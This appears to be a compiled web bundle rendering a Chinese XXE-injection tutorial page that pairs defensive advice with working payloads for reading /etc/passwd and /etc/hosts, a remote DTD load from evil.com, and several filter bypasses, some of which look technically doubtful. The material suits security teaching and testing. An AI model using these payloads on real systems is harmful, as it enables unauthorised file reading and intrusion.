import{_ as t}from"./_plugin-vue_export-helper.cdc0426e.js";import{o as e,c as p,a as n,b as l,d as c,e as s,r as o}from"./app.736b169c.js";const i={},u=s(`<h2 id="漏洞概述" tabindex="-1"><a class="header-anchor" href="#漏洞概述" aria-hidden="true">#</a> 漏洞概述</h2><p>当允许引用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、攻击内网服务</p><p><strong>注意</strong>：执行系统命令(安装expect扩展的PHP环境里才有)</p><details class="custom-container details"><summary>防御XXE</summary><p>1）过滤用户提交的XML数据，关键字<code>&lt;!DOCTYPE,&lt;!ENTITY,SYSTEM</code></p><p>2）使用开发语言提供的禁用外部实体的方法</p><div class="language-c line-numbers-mode" data-ext="c"><pre class="language-c"><code><span class="token comment">//PHP：</span>
<span class="token function">libxml_disable_entity_loader</span><span class="token punctuation">(</span>true<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">//JAVA:</span>
DocumentBuilderFactory dbf <span class="token operator">=</span>DocumentBuilderFactory<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
dbf<span class="token punctuation">.</span><span class="token function">setExpandEntityReferences</span><span class="token punctuation">(</span>false<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details><h2 id="xml基础知识" tabindex="-1"><a class="header-anchor" href="#xml基础知识" aria-hidden="true">#</a> XML基础知识</h2><p>XML是用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型。</p><p>是一种允许用户对自己的标记语言进行定义的源语言。</p><p>XML文档结构包括<code>XML声明</code>、<code>DTD文档类型定义</code>、<code>文档元素</code>。</p><div class="language-xml line-numbers-mode" data-ext="xml"><pre class="language-xml"><code><span class="token comment">&lt;!--XML声明--&gt;</span>
<span class="token prolog">&lt;?xml version=&quot;1.0&quot; ?&gt;</span> 

<span class="token comment">&lt;!--文档类型定义--&gt;</span>
<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">note</span> <span class="token punctuation">[</span><span class="token internal-subset">
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">note</span> <span class="token attr-name">(to,from,heading,bodys)</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">to</span> <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">from</span>  <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">heading</span> <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">bodys</span> <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">&gt;</span></span>
</span><span class="token punctuation">]</span><span class="token punctuation">&gt;</span></span>
<span class="token comment">&lt;!--文档元素--&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>note</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>to</span><span class="token punctuation">&gt;</span></span>北京<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>to</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>from</span><span class="token punctuation">&gt;</span></span>石家庄<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>from</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>heading</span><span class="token punctuation">&gt;</span></span>wintry<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>heading</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bodys</span><span class="token punctuation">&gt;</span></span>wintrysec.github.io<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bodys</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>note</span><span class="token punctuation">&gt;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>DTD(文档类型定义)的作用是定义xml文档的合法构建模块。</p><p>DTD 可以在 XML 文档内声明，也可以外部引用。</p><p>PCDATA 指的是被解析的字符数据（Parsed Character Data）</p><p>XML解析器通常会解析XML文档中所有的文本</p><div class="language-xml line-numbers-mode" data-ext="xml"><pre class="language-xml"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>message</span><span class="token punctuation">&gt;</span></span>此文本会被解析<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>message</span><span class="token punctuation">&gt;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><div class="language-xml line-numbers-mode" data-ext="xml"><pre class="language-xml"><code><span class="token comment">&lt;!--内部声明DTD--&gt;</span>
<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">根元素</span> <span class="token punctuation">[</span><span class="token internal-subset">元素声明</span><span class="token punctuation">]</span><span class="token punctuation">&gt;</span></span>
<span class="token comment">&lt;!--引用外部DTD--&gt;</span>
<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">根元素</span> <span class="token name">SYSTEM</span> <span class="token name">“文件名”</span><span class="token punctuation">&gt;</span></span>
<span class="token comment">&lt;!--或者--&gt;</span>
<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">根元素</span> <span class="token name">PUBLIC</span> <span class="token name">“public_ID”</span> <span class="token name">“文件名”</span><span class="token punctuation">&gt;</span></span>
<span class="token comment">&lt;!--DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用--&gt;</span>

<span class="token comment">&lt;!--内部声明实体--&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">实体名称</span> <span class="token attr-name">“实体的值&quot;</span><span class="token punctuation">&gt;</span></span>
<span class="token comment">&lt;!--引用外部实体--&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">实体名称</span> <span class="token attr-name">SYSTEM</span> <span class="token attr-name">“URI&quot;</span><span class="token punctuation">&gt;</span></span>
<span class="token comment">&lt;!--或者--&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">实体名称</span> <span class="token attr-name">PUBLIC</span> <span class="token attr-name">“public_ID&quot;</span> <span class="token attr-name">“URI&quot;</span><span class="token punctuation">&gt;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="引入恶意外部实体" tabindex="-1"><a class="header-anchor" href="#引入恶意外部实体" aria-hidden="true">#</a> 引入恶意外部实体</h2><h3 id="一、本地引入" tabindex="-1"><a class="header-anchor" href="#一、本地引入" aria-hidden="true">#</a> 一、本地引入</h3><div class="language-xml line-numbers-mode" data-ext="xml"><pre class="language-xml"><code><span class="token prolog">&lt;?xml version=&quot;1.0&quot; ?&gt;</span> 
<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">x</span><span class="token punctuation">[</span><span class="token internal-subset">
&lt;!ENTITY wintry SYSTEM &quot;file:///etc/passwd&quot;&gt;
</span><span class="token punctuation">]</span><span class="token punctuation">&gt;</span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>test</span><span class="token punctuation">&gt;</span></span><span class="token entity named-entity" title="&amp;wintry;">&amp;wintry;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>test</span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!--文档元素--&gt;</span>
<span class="token comment">&lt;!--一个实体由三部分构成: 一个和号 (&amp;), 一个实体名称, 以及一个分号 (;) --&gt;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="二、远程引入" tabindex="-1"><a class="header-anchor" href="#二、远程引入" aria-hidden="true">#</a> 二、远程引入</h3><div class="language-xml line-numbers-mode" data-ext="xml"><pre class="language-xml"><code><span class="token prolog">&lt;?xml version=&quot;1.0&quot; ?&gt;</span>
<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">x</span><span class="token punctuation">[</span><span class="token internal-subset">
&lt;!ENTITY %d SYSTEM &quot;http://evil.com/evil.dtd&quot;&gt;
%d;
</span><span class="token punctuation">]</span><span class="token punctuation">&gt;</span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>test</span><span class="token punctuation">&gt;</span></span>&amp;wintrysec;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>test</span><span class="token punctuation">&gt;</span></span>

<span class="token comment">&lt;!--DTD文件(evil.dtd)内容：--&gt;</span>
&lt;!ENTITY wintrysec SYSTEM “file:///etc/passwd&quot;&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="三、远程引入2" tabindex="-1"><a class="header-anchor" href="#三、远程引入2" aria-hidden="true">#</a> 三、远程引入2</h3><div class="language-xml line-numbers-mode" data-ext="xml"><pre class="language-xml"><code><span class="token prolog">&lt;?xml version=&quot;1.0&quot; ?&gt;</span>
<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">x</span> <span class="token name">SYSTEM</span> <span class="token string">&quot;http://evil.com/evil.dtd&quot;</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>test</span><span class="token punctuation">&gt;</span></span>&amp;wintrysec;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>test</span><span class="token punctuation">&gt;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="漏洞验证" tabindex="-1"><a class="header-anchor" href="#漏洞验证" aria-hidden="true">#</a> 漏洞验证</h2><p>寻找那些接受XML作为输入内容的端点。用Burp抓包，随便输入密码点击登录，观察应用程序的XML传输数据。</p><p>应用程序正在解析XML内容，接受特定的输入，然后将其呈现给用户</p><p>Burp抓包修改请求的XML内容，重放（定义一个名为wintrysec，值为 &#39;wintrysec666&#39; 的实体）</p><p>根据响应报文得知，解析器已经解析了我们发送的XML实体，并将实体内容呈现出来了。</p><p>由此，可以确认，这个应用程序存在XXE漏洞。</p><h4 id="读取任意文件poc" tabindex="-1"><a class="header-anchor" href="#读取任意文件poc" aria-hidden="true">#</a> 读取任意文件POC</h4><div class="language-xml line-numbers-mode" data-ext="xml"><pre class="language-xml"><code><span class="token prolog">&lt;?xml version=&quot;1.0&quot;?&gt;</span> 
<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">a</span> <span class="token punctuation">[</span><span class="token internal-subset"> 
   &lt;!ENTITY wintrysec SYSTEM &quot;file:///etc/hosts&quot;&gt; 
</span><span class="token punctuation">]</span><span class="token punctuation">&gt;</span></span> 
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">&gt;</span></span>&amp;wintrysec;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">&gt;</span></span>123<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">&gt;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="漏洞利用" tabindex="-1"><a class="header-anchor" href="#漏洞利用" aria-hidden="true">#</a> 漏洞利用</h2>`,31),d={href:"https://www.cnblogs.com/zhengna/p/15740341.html",target:"_blank",rel:"noopener noreferrer"},r=s(`<h3 id="xxe过滤了system关键字如何绕过" tabindex="-1"><a class="header-anchor" href="#xxe过滤了system关键字如何绕过" aria-hidden="true">#</a> XXE过滤了SYSTEM关键字如何绕过</h3><p>1）使用特殊字符来欺骗过滤器，例如使用空格、制表符或换行符</p><div class="language-xml line-numbers-mode" data-ext="xml"><pre class="language-xml"><code><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">test</span> <span class="token punctuation">[</span><span class="token internal-subset">
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">test</span> <span class="token attr-name">ANY</span> <span class="token punctuation">&gt;</span></span>
&lt;!ENTITY % externalSystem SYSTEM &quot;file:///etc/passwd&quot;&gt;
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">%</span> <span class="token attr-name">start</span> <span class="token attr-name">&quot;&lt;![CDATA[&quot;</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">%</span> <span class="token attr-name">end</span> <span class="token attr-name">&quot;]]</span><span class="token punctuation">&gt;</span></span>&quot;&gt;
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">%</span> <span class="token attr-name">payload</span> <span class="token attr-name">&quot;%start;%externalSystem;%end;&quot;</span><span class="token punctuation">&gt;</span></span>
</span><span class="token punctuation">]</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>test</span><span class="token punctuation">&gt;</span></span><span class="token entity named-entity" title="&amp;payload;">&amp;payload;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>test</span><span class="token punctuation">&gt;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>2）使用URL编码来绕过关键字过滤器</p><div class="language-http line-numbers-mode" data-ext="http"><pre class="language-http"><code>SYSTEM关键字编码为 %53%59%53%54%45%4d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>3）在XML实体中使用别名代替SYSTEM关键字</p><div class="language-xml line-numbers-mode" data-ext="xml"><pre class="language-xml"><code><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">test</span> <span class="token punctuation">[</span><span class="token internal-subset">
&lt;!ENTITY mysystem &quot;file:///etc/passwd&quot;&gt;
</span><span class="token punctuation">]</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>test</span><span class="token punctuation">&gt;</span></span><span class="token entity named-entity" title="&amp;mysystem;">&amp;mysystem;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>test</span><span class="token punctuation">&gt;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,7);function k(m,g){const a=o("ExternalLinkIcon");return e(),p("div",null,[u,n("p",null,[n("a",d,[l("https://www.cnblogs.com/zhengna/p/15740341.html"),c(a)])]),r])}const h=t(i,[["render",k],["__file","XXE注入漏洞.html.vue"]]);export{h as default};
